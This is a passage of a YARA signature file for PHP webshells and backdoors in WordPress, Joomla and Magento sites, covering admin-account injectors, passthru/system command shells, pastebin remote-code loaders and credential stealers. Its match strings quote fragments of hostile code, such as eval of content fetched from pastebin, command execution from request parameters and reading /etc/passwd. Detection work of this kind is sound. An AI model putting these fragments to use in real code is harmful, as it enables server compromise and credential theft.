    strings:
        $ps0 = "hex2bin"
    condition:
        $ps0
}

rule php_backdoor_injector_132 : backdoor
{
    strings:
        $trigger = "$answer['message'] = $message;"
    condition:
        $trigger and PR02543 and PR02544 and PR02545 and PR02546 and PR02534
}

// MANUAL FIX NECESSARY
private rule PR02547 : trigger
{
    strings:
        $ps0 = "include_once( get_template_directory() ."
    condition:
        $ps0
}

rule php_backdoor_injector_132_02 : backdoor
{
    strings:
        $trigger = "&& file_exists( get_template_directory()"
        $php_backdoor_injector_132_02_r0 = /if[\s]*\([\s]*![\s]*class_exists[\s]*\([\s]*[^\)]+\)[\s]*&&[\s]*file_exists[\s]*\([\s]*get_template_directory\(\)[\s]*\.[^{]+\{[\s]*include_once[\s]*\([\s]*get_template_directory\(\)[\s]*\.[^;]+\);[\s]*\}/
    condition:
        $trigger and PR02547 and $php_backdoor_injector_132_02_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_injector_133 : backdoor
{
    strings:
        $trigger = "copy"
        $php_backdoor_injector_133_r0 = /if[\s]*\([\s]*\(!@file_exists\(.[^\)]+\)[\s]*\|\|[\s]*@md5_file\([^@]+[\s]*&&[\s]*@file_exists\([^@]+&&[\s]*@md5_file\([^@]+\)[\s]*\{[\s]*@chmod\([^@]+[\d]+\);[\s]*@copy\([^@]+\);[\s]*@chmod\([^\}]+[\d]+\)[\s]*;[\s]*\}/
    condition:
        $trigger and $php_backdoor_injector_133_r0
}

private rule PR02548 : trigger
{
    strings:
        $ps0 = "DIRECTORY_SEPARATOR"
    condition:
        $ps0
}

private rule PR02549 : trigger
{
    strings:
        $ps0 = "CURLOPT_USERAGENT"
    condition:
        $ps0
}

rule php_backdoor_injector_134 : backdoor
{
    strings:
        $trigger = ");return $a[$i];}  if(!empty($_SERVER[_"
    condition:
        $trigger and PR02548 and PR00265 and PR02549
}

private rule PR02550 : trigger
{
    strings:
        $ps0 = "file_put_contents(\"../../../../.."
    condition:
        $ps0
}

rule php_backdoor_injector_135 : backdoor
{
    strings:
        $trigger = "WRpZSgpO30gPz4=\"); @file_put_contents($_SERVER['DOCUMENT_ROOT'].\""
    condition:
        $trigger and PR02550
}

private rule PR02551 : trigger
{
    strings:
        $ps0 = ";unlink(__FILE__);rmdir(__DIR__);`rm -fr .."
    condition:
        $ps0
}

rule php_backdoor_injector_135_02 : backdoor
{
    strings:
        $trigger = "file_put_contents(\"../../../../.."
    condition:
        $trigger and PR02551
}

rule php_backdoor_injector_136 : backdoor
{
    strings:
        $trigger = "base64_decode(gzinflate(base64_decode('dVXblqI6FPygeeGi08OjcpM4YHMJtzchPaAJyDpq2/D1pwB7dE6fecgihE3tyq7Kzquh3fabVWX4p/dtJW0N"
    condition:
        $trigger and PR01403 and PR01415
}

private rule PR02552 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['adm_sniff']) && isset($_POST['pasw'])"
    condition:
        $ps0
}

rule php_backdoor_injector_137 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR02552
}

private rule PR02553 : trigger
{
    strings:
        $ps0 = "echo ('<FORM method=\"GET\"><INPUT type=\"text\" name=\"filename\" value=\"runlib.php\"><INPUT type=\"submit\" value=\"Make and go\"></FORM>');"
    condition:
        $ps0
}

rule php_backdoor_injector_138 : backdoor
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR02553
}

private rule PR02554 : trigger
{
    strings:
        $ps0 = "echo \"<originalfilenotfound>\";"
    condition:
        $ps0
}

rule php_backdoor_injector_139 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR00357 and PR02554
}

private rule PR02555 : trigger
{
    strings:
        $ps0 = "file_get_contents($root"
    condition:
        $ps0
}

rule php_backdoor_injector_140 : backdoor
{
    strings:
        $trigger = "fclose($opindex);"
    condition:
        $trigger and PR00355 and PR02555 and PR00357
}

private rule PR02556 : trigger
{
    strings:
        $ps0 = "$finish_test = stristr($finish_check_htaccess, $incl);"
    condition:
        $ps0
}

rule php_backdoor_injector_141 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR02556 and PR00357
}

private rule PR02557 : trigger
{
    strings:
        $ps0 = "preg_match_all('/\\{PROB-(\\d+)\\}(.+?)\\{\\/PROB\\}/i', $"
    condition:
        $ps0
}

rule php_backdoor_injector_142 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR02557 and PR00357
}

private rule PR02558 : trigger
{
    strings:
        $ps0 = "if(@copy("
    condition:
        $ps0
}

private rule PR02559 : trigger
{
    strings:
        $ps0 = "if(@file_put_contents($twentytwenty.$newFileName.'/.template-"
    condition:
        $ps0
}

rule php_backdoor_injector_143 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02558 and PR02559
}

rule php_backdoor_injector_144 : backdoor
{
    strings:
        $trigger = "aWYgKGlzX2ZpbGUoJF"
    condition:
        $trigger and PR01350
}

private rule PR02560 : trigger
{
    strings:
        $ps0 = "{echo'*OK*';exit;}"
    condition:
        $ps0
}

rule php_backdoor_injector_145 : backdoor
{
    strings:
        $trigger = "(function_exists('curl_init'))"
    condition:
        $trigger and PR02560
}

rule php_backdoor_injector_146 : backdoor
{
    strings:
        $trigger = "DQoNCiRyb290PSRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl07DQppZihmaWxlX2V4aX"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02561 : trigger
{
    strings:
        $ps0 = "$fp=fopen(\"$check\",\"w+\");"
    condition:
        $ps0
}

rule php_backdoor_injector_147 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02561 and PR01403
}

private rule PR02562 : trigger
{
    strings:
        $ps0 = "return strtr($"
    condition:
        $ps0
}

private rule PR02563 : trigger
{
    strings:
        $ps0 = "(false !== strpos($"
    condition:
        $ps0
}

private rule PR02564 : trigger
{
    strings:
        $ps0 = "($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_injector_149 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR02562 and PR02563 and PR02564
}

private rule PR02565 : trigger
{
    strings:
        $ps0 = "shell_exec($in);"
    condition:
        $ps0
}

private rule PR02566 : trigger
{
    strings:
        $ps0 = "function rumCmd"
    condition:
        $ps0
}

private rule PR02567 : trigger
{
    strings:
        $ps0 = "(!@feof($"
    condition:
        $ps0
}

rule php_backdoor_injector_150 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02565 and PR02566 and PR02567
}

private rule PR02568 : trigger
{
    strings:
        $ps0 = "interconnectit"
    condition:
        $ps0
}

rule php_backdoor_interconnectit_wp_s_and_r_001 : backdoor
{
    strings:
        $trigger = "<p style=\"color:red\">Delete this utility from your"
    condition:
        $trigger and PR02568 and PR01355
}

private rule PR02569 : trigger
{
    strings:
        $ps0 = "\\x28\\x65\\x74\\x61\\x6c\\x66\\x6e\\x69\\x7a\\x67\\x28\\x6c\\x61\\x76\\x65"
    condition:
        $ps0
}

rule php_backdoor_ip_check_001 : backdoor
{
    strings:
        $trigger = "].@$_["
    condition:
        $trigger and PR02569
}

private rule PR02570 : trigger
{
    strings:
        $ps0 = "$email = JRequest::getVar('email','developer222@gmail.com');"
    condition:
        $ps0
}

rule php_backdoor_joomlasuperuser_001 : backdoor
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR02570
}

rule php_backdoor_joomlasuperuser_002 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST['c']) && $_REQUEST['c']=='user"
    condition:
        $trigger
}

rule php_backdoor_joomlasuperuser_003 : backdoor
{
    strings:
        $trigger = "$data['name'] = 'Zhano Zhano';"
    condition:
        $trigger and PR00732
}

private rule PR02571 : trigger
{
    strings:
        $ps0 = "WHERE usertype=\"Super Administrator\" LIMIT 1"
    condition:
        $ps0
}

private rule PR02572 : trigger
{
    strings:
        $ps0 = "triggerEvent('onUserLogin', array(array('username"
    condition:
        $ps0
}

rule php_backdoor_joomlasuperuser_004 : backdoor
{
    strings:
        $trigger = "jimport('joomla.user.helper"
    condition:
        $trigger and PR00203 and PR02571 and PR02572
}

private rule PR02573 : trigger
{
    strings:
        $ps0 = "print \"<user>{$data['username']}</user><login>{$base_url}"
    condition:
        $ps0
}

private rule PR02574 : trigger
{
    strings:
        $ps0 = "wp_insert_user("
    condition:
        $ps0
}

rule php_backdoor_joomlasuperuser_005 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02573 and PR01788 and PR02574
}

private rule PR02575 : trigger
{
    strings:
        $ps0 = "'Super Administrator';"
    condition:
        $ps0
}

rule php_backdoor_joomlasuperuser_006 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02575 and PR02574
}

private rule PR02576 : trigger
{
    strings:
        $ps0 = "INSERT INTO `\".$JConfig->dbprefix.\"user_usergroup_map"
    condition:
        $ps0
}

private rule PR02577 : trigger
{
    strings:
        $ps0 = "new mysqli($JConfig"
    condition:
        $ps0
}

rule php_backdoor_joomlasuperuser_007 : backdoor
{
    strings:
        $trigger = "file_"
    condition:
        $trigger and PR02576 and PR02577
}

private rule PR02578 : trigger
{
    strings:
        $ps0 = "Super Administrator"
    condition:
        $ps0
}

private rule PR02579 : trigger
{
    strings:
        $ps0 = "print \"<user><login>"
    condition:
        $ps0
}

rule php_backdoor_joomla_adminadd_001 : backdoor
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR02578 and PR02579
}

private rule PR02580 : trigger
{
    strings:
        $ps0 = "06b140be12e80b1fc08ad42611caa64a3e56ee163d3c8a088b"
    condition:
        $ps0
}

rule php_backdoor_joomla_gen_00 : backdoor
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR02580
}

private rule PR02581 : trigger
{
    strings:
        $ps0 = "isset($_POST['ok']) && isset($_FILES['joomLa"
    condition:
        $ps0
}

rule php_backdoor_joomla_gen_003 : backdoor
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR02581
}

private rule PR02582 : trigger
{
    strings:
        $ps0 = "$this->parseSession($_POST[$config['UID']]);"
    condition:
        $ps0
}

private rule PR02583 : trigger
{
    strings:
        $ps0 = "function parseSession"
    condition:
        $ps0
}

rule php_backdoor_joomla_gen_004 : backdoor
{
    strings:
        $trigger = "$b64 = \"ABCDEFGHIJ"
    condition:
        $trigger and PR00029 and PR02582 and PR02583
}

// MANUAL FIX NECESSARY
private rule PR02584 : trigger
{
    strings:
        $ps0 = "$stringData = $_SERVER[\"SERVER_NAME\"] . \"|\" . $credentials[\"username\"] . \":\" . $credentials[\"password\"] . \"|\" . $ip . \"\\n\";"
    condition:
        $ps0
}

rule php_backdoor_joomla_steal_001_02 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_joomla_steal_001_02_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR02584 and PR00355 and PR00357 and $php_backdoor_joomla_steal_001_02_r0
}

rule php_backdoor_jsys_001 : backdoor
{
    strings:
        $trigger = "<title>jsys.php</title>"
    condition:
        $trigger
}

rule php_backdoor_jsys_002 : backdoor
{
    strings:
        $trigger = "class JSYS_Utils"
    condition:
        $trigger and PR00042
}

rule php_backdoor_lightshell_001 : backdoor
{
    strings:
        $trigger = "print \"<td id=\\\"cell\\\">\".getperms($di"
    condition:
        $trigger and PR01648
}

private rule PR02585 : trigger
{
    strings:
        $ps0 = "\"teg_\""
    condition:
        $ps0
}

private rule PR02586 : trigger
{
    strings:
        $ps0 = "localdate"
    condition:
        $ps0
}

rule php_backdoor_localdate_001 : backdoor
{
    strings:
        $trigger = "if(substr(md5($"
    condition:
        $trigger and PR02585 and PR02586
}

private rule PR02587 : trigger
{
    strings:
        $ps0 = "system($time); exit;"
    condition:
        $ps0
}

rule php_backdoor_localdate_002 : backdoor
{
    strings:
        $trigger = "localdate"
    condition:
        $trigger and PR00732 and PR02587
}

private rule PR02588 : trigger
{
    strings:
        $ps0 = "include($_GET[\"file\""
    condition:
        $ps0
}

private rule PR02589 : trigger
{
    strings:
        $ps0 = "echo ini_get(\"safe_mode\");"
    condition:
        $ps0
}

rule php_backdoor_lolshell_001 : backdoor
{
    strings:
        $trigger = "echo ini_get(\"open_basedir\");"
    condition:
        $trigger and PR02588 and PR02589
}

private rule PR02590 : trigger
{
    strings:
        $ps0 = "include($_GET[\"oscey\""
    condition:
        $ps0
}

rule php_backdoor_lolshell_001_02 : backdoor
{
    strings:
        $trigger = "echo ini_get(\"open_basedir\");"
    condition:
        $trigger and PR02590 and PR02589
}

private rule PR02591 : trigger
{
    strings:
        $ps0 = "$filecwd = $_POST['filecwd'];"
    condition:
        $ps0
}

rule php_backdoor_lolshell_001_03 : backdoor
{
    strings:
        $trigger = "echo ini_get(\"open_basedir\");"
    condition:
        $trigger and PR02591 and PR02394 and PR02589
}

rule php_backdoor_lolshell_001_04 : backdoor
{
    strings:
        $trigger = "LOLShell"
    condition:
        $trigger
}

rule php_backdoor_magentologin_001 : backdoor
{
    strings:
        $trigger = "Mage::getModel('admin/user')->load($_GET['user_id'"
    condition:
        $trigger
}

rule php_backdoor_magentologin_002 : backdoor
{
    strings:
        $trigger = "$isi='Usermail: '.$login['username"
    condition:
        $trigger and PR00301
}

private rule PR02592 : trigger
{
    strings:
        $ps0 = "$data = post(sprintf(\"%s://%s/admin/Cms_Wysiwyg/directive/index"
    condition:
        $ps0
}

rule php_backdoor_magentologin_003 : backdoor
{
    strings:
        $trigger = "function exploit($url){"
    condition:
        $trigger and PR00732 and PR02592
}

private rule PR02593 : trigger
{
    strings:
        $ps0 = "INSERT INTO `\".$prefix.\"admin_user` (`firstname`, `lastname`,`email`,`username`,`password`"
    condition:
        $ps0
}

rule php_backdoor_magentologin_003_02 : backdoor
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR02593
}

private rule PR02594 : trigger
{
    strings:
        $ps0 = "new indoxploit_mage_exploit();"
    condition:
        $ps0
}

rule php_backdoor_magentologin_004 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR02594
}

// MANUAL FIX NECESSARY
private rule PR02595 : trigger
{
    strings:
        $ps0 = "$user->setRoleIds(array(1)"
    condition:
        $ps0
}

rule php_backdoor_magentologin_005 : backdoor
{
    strings:
        $trigger = "require_once"
        $php_backdoor_magentologin_005_r0 = /= Mage::getModel\(.admin\/user.\)/
    condition:
        $trigger and PR02595 and $php_backdoor_magentologin_005_r0
}

rule php_backdoor_magentologin_006 : backdoor
{
    strings:
        $trigger = "[<a href=\"?a=c\">Connection</a>] [<a href=\"?a=o\">Orders</a>] [<a href=\"?a=a\">Add admin</a>] [<a href=\"?a=l\">Admin list"
    condition:
        $trigger and PR00042 and PR00281
}

private rule PR02596 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($_FILES[\"fileToUpload\"]"
    condition:
        $ps0
}

private rule PR02597 : trigger
{
    strings:
        $ps0 = " * @category   Mage"
    condition:
        $ps0
}

private rule PR02598 : trigger
{
    strings:
        $ps0 = "if(isset($_POST[\"s\"])) { $target_file = basename($_FILES[\"fileToUpload"
    condition:
        $ps0
}

rule php_backdoor_magentouploader_001_02 : backdoor
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR02596 and PR02597 and PR02598
}

rule php_backdoor_magentouploader_003 : backdoor
{
    strings:
        $trigger = ">Magento File Upload Vulnerability<"
    condition:
        $trigger
}

rule php_backdoor_magentouploader_004 : backdoor
{
    strings:
        $trigger = "Magento Jquery Upload Scanner"
    condition:
        $trigger
}

private rule PR02599 : trigger
{
    strings:
        $ps0 = "$b64('aHR0cDov"
    condition:
        $ps0
}

private rule PR02600 : trigger
{
    strings:
        $ps0 = "$b64  = \"base"
    condition:
        $ps0
}

rule php_backdoor_magentouploader_006 : backdoor
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR02599 and PR02600
}

rule php_backdoor_magentouploader_007 : backdoor
{
    strings:
        $trigger = "userfile_name;@move_uploaded_file($userfile_tmp,$abod);echo'<"
    condition:
        $trigger and PR00039 and PR02056
}

rule php_backdoor_MagicIncludeShell_001 : backdoor
{
    strings:
        $trigger = "Magic Include Shell"
    condition:
        $trigger
}

rule php_backdoor_MagicIncludeShell_001_001 : backdoor
{
    strings:
        $trigger = "<?php print \"$site?$kverya\"; ?>"
    condition:
        $trigger
}

rule php_backdoor_mb_ereg_replace_001 : backdoor
{
    strings:
        $trigger = "mb_ereg_replace('.*',@$_REQUEST["
    condition:
        $trigger
}

rule php_backdoor_meterpreter_001 : backdoor
{
    strings:
        $trigger = "my_print(\"Evaling main meterpreter stage\");"
    condition:
        $trigger and PR00013
}

rule php_backdoor_MulCiShell_001 : backdoor
{
    strings:
        $trigger = "MulCiShell"
    condition:
        $trigger and PR01801 and PR01746
}

private rule PR02601 : trigger
{
    strings:
        $ps0 = "echo eval(stripslashes($_POST['phpcode']));"
    condition:
        $ps0
}

rule php_backdoor_MulCiShell_001_02 : backdoor
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR02601
}

private rule PR02602 : trigger
{
    strings:
        $ps0 = "<center><h2>Gentoo @ MyHack</h2></center>"
    condition:
        $ps0
}

rule php_backdoor_myhack_001 : backdoor
{
    strings:
        $trigger = "hell"
    condition:
        $trigger and PR02602
}

rule php_backdoor_myhack_002 : backdoor
{
    strings:
        $trigger = "$btname = 'backtool.txt';"
    condition:
        $trigger and PR00013
}

private rule PR02603 : trigger
{
    strings:
        $ps0 = " = stripcslashes($_POST['"
    condition:
        $ps0
}

rule php_backdoor_mysql_shell_003 : backdoor
{
    strings:
        $trigger = "mysql_select_db("
    condition:
        $trigger and PR02603
}

private rule PR02604 : trigger
{
    strings:
        $ps0 = "load data local infile"
    condition:
        $ps0
}

private rule PR02605 : trigger
{
    strings:
        $ps0 = "mysql_select_db("
    condition:
        $ps0
}

rule php_backdoor_mysql_shell_004 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR02604 and PR02605
}

private rule PR02606 : trigger
{
    strings:
        $ps0 = "$password="
    condition:
        $ps0
}

rule php_backdoor_neirong_001 : backdoor
{
    strings:
        $trigger = "if(fwrite($fo,$_POST"
    condition:
        $trigger and PR02606
}

rule php_backdoor_noname_shell_001 : backdoor
{
    strings:
        $trigger = "Xai Syndicate"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_nsTView_001 : backdoor
{
    strings:
        $trigger = "passthru(\"gcc /tmp/nst_c_bd.c -o"
    condition:
        $trigger
}

private rule PR02607 : trigger
{
    strings:
        $ps0 = "$sitetitle = 'OSFM Static';"
    condition:
        $ps0
}

private rule PR02608 : trigger
{
    strings:
        $ps0 = "$user = 'admin';"
    condition:
        $ps0
}

rule php_backdoor_osfmdefault_001 : backdoor
{
    strings:
        $trigger = "$pass = 'pass';"
    condition:
        $trigger and PR02607 and PR00391 and PR01514 and PR02608
}

private rule PR02609 : trigger
{
    strings:
        $ps0 = "*/"
    condition:
        $ps0
}

private rule PR02610 : trigger
{
    strings:
        $ps0 = ";$_o=\"\\160\\141\\143\\153\";$_o0=~$_o("
    condition:
        $ps0
}

rule php_backdoor_pack_001 : backdoor
{
    strings:
        $trigger = "^"
    condition:
        $trigger and PR02609 and PR02610
}

// MANUAL FIX NECESSARY
private rule PR02611 : trigger
{
    strings:
        $ps0 = "29207b0a406576616c286261736536345f646563"
    condition:
        $ps0
}

rule php_backdoor_pack_002 : backdoor
{
    strings:
        $trigger = "$_GET["
        $php_backdoor_pack_002_r0 = /if\(\$_GET\[[^\]]+\][\s]*==[\s]*[\d]+\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*['\. creat_funio]+;/
    condition:
        $trigger and PR02611 and $php_backdoor_pack_002_r0
}

private rule PR02612 : trigger
{
    strings:
        $ps0 = "(int) hex2bin("
    condition:
        $ps0
}

private rule PR02613 : trigger
{
    strings:
        $ps0 = "!function_exists('hex2bin"
    condition:
        $ps0
}

rule php_backdoor_pack_003 : backdoor
{
    strings:
        $trigger = "pack(\"H*\","
    condition:
        $trigger and PR02612 and PR00029 and PR01422 and PR02613
}

private rule PR02614 : trigger
{
    strings:
        $ps0 = "substr(md5(strrev($"
    condition:
        $ps0
}

rule php_backdoor_pas_webshell_001 : backdoor
{
    strings:
        $trigger = "]:(isset($_COOKIE["
    condition:
        $trigger and PR02614
}

private rule PR02615 : trigger
{
    strings:
        $ps0 = "if(!PE && !IW){if(@is_readable('/etc/passwd')){"
    condition:
        $ps0
}

rule php_backdoor_pas_webshell_002 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02615
}

private rule PR02616 : trigger
{
    strings:
        $ps0 = "]:(isset($_"
    condition:
        $ps0
}

rule php_backdoor_pas_webshell_004 : backdoor
{
    strings:
        $trigger = "substr(MD5(strrev($"
    condition:
        $trigger and PR00732 and PR02616
}

rule php_backdoor_pas_webshell_005 : backdoor
{
    strings:
        $trigger = "gzINFLATe($e))&&(md5(SUBsTr($e,"
    condition:
        $trigger
}

private rule PR02617 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST"
    condition:
        $ps0
}

private rule PR02618 : trigger
{
    strings:
        $ps0 = "$cmd = base64_decode(($_REQUEST"
    condition:
        $ps0
}

rule php_backdoor_passthru_003 : backdoor
{
    strings:
        $trigger = "passthru($_REQUEST["
    condition:
        $trigger and PR02617 and PR02618
}

private rule PR02619 : trigger
{
    strings:
        $ps0 = "= base64_decode(($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_passthru_003_002 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02617 and PR02619
}

private rule PR02620 : trigger
{
    strings:
        $ps0 = "$emails = $_POST['emails'];"
    condition:
        $ps0
}

rule php_backdoor_passthru_004 : backdoor
{
    strings:
        $trigger = "passthru($emails);"
    condition:
        $trigger and PR02620
}

private rule PR02621 : trigger
{
    strings:
        $ps0 = "$my_smtp = $_POST"
    condition:
        $ps0
}

private rule PR02622 : trigger
{
    strings:
        $ps0 = "$cnurl = @file_get_contents($url);"
    condition:
        $ps0
}

rule php_backdoor_passthru_005 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02621 and PR02622
}

private rule PR02623 : trigger
{
    strings:
        $ps0 = "DoCmd($_REQUEST['cmd']);"
    condition:
        $ps0
}

rule php_backdoor_passthru_006 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02623
}

rule php_backdoor_passthru_007 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"DZW1rsUIskX/ZaJuOTDD0dMEZmZ"
    condition:
        $trigger
}

rule php_backdoor_passthru_008 : backdoor
{
    strings:
        $trigger = "die(passthru($_GET["
    condition:
        $trigger
}

private rule PR02624 : trigger
{
    strings:
        $ps0 = "passthru($_GET["
    condition:
        $ps0
}

rule php_backdoor_passthru_009 : backdoor
{
    strings:
        $trigger = "system($_GET["
    condition:
        $trigger and PR02624
}

private rule PR02625 : trigger
{
    strings:
        $ps0 = "/usr/local/cpanel/bin/"
    condition:
        $ps0
}

private rule PR02626 : trigger
{
    strings:
        $ps0 = "fileperms(dirname(__FILE__))), -3) == '777')"
    condition:
        $ps0
}

rule php_backdoor_passthru_010 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02625 and PR02626
}

private rule PR02627 : trigger
{
    strings:
        $ps0 = "passthru($cmd);"
    condition:
        $ps0
}

rule php_backdoor_passthru_011 : backdoor
{
    strings:
        $trigger = "['cmd']"
    condition:
        $trigger and PR02627
}

private rule PR02628 : trigger
{
    strings:
        $ps0 = "encodeIt(this);return"
    condition:
        $ps0
}

rule php_backdoor_passthru_012 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR02628 and PR01444
}

private rule PR02629 : trigger
{
    strings:
        $ps0 = "ZXZhbCUyOCUyNnF1b3Ql"
    condition:
        $ps0
}

private rule PR02630 : trigger
{
    strings:
        $ps0 = "(isset($_GET[\"644\"])) { chmod(\"../wp-config.php\",0644); die;"
    condition:
        $ps0
}

rule php_backdoor_passthru_013 : backdoor
{
    strings:
        $trigger = "))); exit; die; }"
    condition:
        $trigger and PR01436 and PR00029 and PR02629 and PR02630
}

private rule PR02631 : trigger
{
    strings:
        $ps0 = "system($"
    condition:
        $ps0
}

private rule PR02632 : trigger
{
    strings:
        $ps0 = "function ex($"
    condition:
        $ps0
}

rule php_backdoor_passthru_014 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02631 and PR02632 and PR02567
}

private rule PR02633 : trigger
{
    strings:
        $ps0 = "system(\"curl -O"
    condition:
        $ps0
}

private rule PR02634 : trigger
{
    strings:
        $ps0 = "shell_exec(\"lynx"
    condition:
        $ps0
}

rule php_backdoor_passthru_015 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02633 and PR02634
}

private rule PR02635 : trigger
{
    strings:
        $ps0 = "if($m($b($_POST['c'])) == $pw) { setcookie"
    condition:
        $ps0
}

rule php_backdoor_passthru_016 : backdoor
{
    strings:
        $trigger = "\"\\x6D\\x64\\x35\";"
    condition:
        $trigger and PR02635
}

private rule PR02636 : trigger
{
    strings:
        $ps0 = "eval(base64_decode($_REQUEST[\"c\"]));}}catch(Exception $e){header("
    condition:
        $ps0
}

rule php_backdoor_passthru_017 : backdoor
{
    strings:
        $trigger = "passthru($_REQUEST["
    condition:
        $trigger and PR02617 and PR02636
}

rule php_backdoor_pastebin_uploader_002 : backdoor
{
    strings:
        $trigger = "file_get_contents(\"http://pastebin.com/raw"
    condition:
        $trigger and PR01403
}

rule php_backdoor_pastebin_uploader_003 : backdoor
{
    strings:
        $trigger = "ploit<"
    condition:
        $trigger and PR02146 and PR01431
}

private rule PR02637 : trigger
{
    strings:
        $ps0 = "= @file_get_contents(\"http://pastebin.com/raw/"
    condition:
        $ps0
}

rule php_backdoor_pastebin_uploader_004 : backdoor
{
    strings:
        $trigger = "=getcwd();"
    condition:
        $trigger and PR01403 and PR02637
}

rule php_backdoor_pastebin_uploader_005 : backdoor
{
    strings:
        $trigger = "<?php die(eval(file_get_contents(\"http://pastebin.com/raw.php?i="
    condition:
        $trigger
}

private rule PR02638 : trigger
{
    strings:
        $ps0 = "http_get(\"http://pastebin.com"
    condition:
        $ps0
}

rule php_backdoor_pastebin_uploader_006 : backdoor
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR02638
}

rule php_backdoor_pastebin_uploader_007 : backdoor
{
    strings:
        $trigger = ">Mr.Dr3awe"
    condition:
        $trigger and PR01403 and PR02146 and PR01431
}

private rule PR02639 : trigger
{
    strings:
        $ps0 = "file_get_contents(\"http://pastebin.com/raw"
    condition:
        $ps0
}

private rule PR02640 : trigger
{
    strings:
        $ps0 = "if(array_keys($_GET)["
    condition:
        $ps0
}

rule php_backdoor_pastebin_uploader_008 : backdoor
{
    strings:
        $trigger = "if($content){unlink("
    condition:
        $trigger and PR01403 and PR02639 and PR02640
}

rule php_backdoor_pastebin_uploader_009 : backdoor
{
    strings:
        $trigger = "$usercp = explode(\"\\r\\n\", $_POST['user_cp']);"
    condition:
        $trigger and PR01403 and PR02639
}

private rule PR02641 : trigger
{
    strings:
        $ps0 = "@symlink"
    condition:
        $ps0
}

private rule PR02642 : trigger
{
    strings:
        $ps0 = "scandir($path);"
    condition:
        $ps0
}

rule php_backdoor_pastebin_uploader_010 : backdoor
{
    strings:
        $trigger = "file_get_contents(\"http://pastebin.com/raw"
    condition:
        $trigger and PR02641 and PR02642 and PR01403
}

rule php_backdoor_pastebin_uploader_011 : backdoor
{
    strings:
        $trigger = "eval(\"?>\".(base64_decode("
    condition:
        $trigger and PR01431
}

rule php_backdoor_pastebin_uploader_012 : backdoor
{
    strings:
        $trigger = "base64_decode(file_get_contents(\"http://pastebin.com"
    condition:
        $trigger and PR02146
}

private rule PR02643 : trigger
{
    strings:
        $ps0 = "echo date('H:i:s ').'done';"
    condition:
        $ps0
}

rule php_backdoor_pastebin_uploader_013 : backdoor
{
    strings:
        $trigger = "findFilesFromDirectory($dir, $files, $find);"
    condition:
        $trigger and PR00355 and PR02643 and PR00357 and PR01431
}

rule php_backdoor_pastebin_uploader_014 : backdoor
{
    strings:
        $trigger = "curl_setopt($st,CURLOPT_URL,base64_decode(\"aHR0cDovL3Bhc3RlYmluLmNvbS9y"
    condition:
        $trigger and PR00092
}

private rule PR02644 : trigger
{
    strings:
        $ps0 = "eval($ex);"
    condition:
        $ps0
}

private rule PR02645 : trigger
{
    strings:
        $ps0 = "if (!touch("
    condition:
        $ps0
}

rule php_backdoor_pastebin_uploader_015 : backdoor
{
    strings:
        $trigger = ",CURLOPT_URL,base64_decode(\"aHR0"
    condition:
        $trigger and PR02644 and PR02645
}

private rule PR02646 : trigger
{
    strings:
        $ps0 = "$shell_doc_root = @file_get_contents('https"
    condition:
        $ps0
}

rule php_backdoor_pastebin_uploader_016 : backdoor
{
    strings:
        $trigger = "://pastebin.com/raw"
    condition:
        $trigger and PR02646
}

rule php_backdoor_pastebin_uploader_017 : backdoor
{
    strings:
        $trigger = "get_contents('http://pastebin.com/raw/"
    condition:
        $trigger and PR01553 and PR01401 and PR01554
}

rule php_backdoor_pastebin_uploader_018 : backdoor
{
    strings:
        $trigger = "eval(\"?>\".file_get_contents(\"https://pastebin.com/raw"
    condition:
        $trigger
}

private rule PR02647 : trigger
{
    strings:
        $ps0 = "$back_connect_c=\"I2luY2x1ZGUgPHN0ZG"
    condition:
        $ps0
}

rule php_backdoor_perl_shell_001 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02647
}

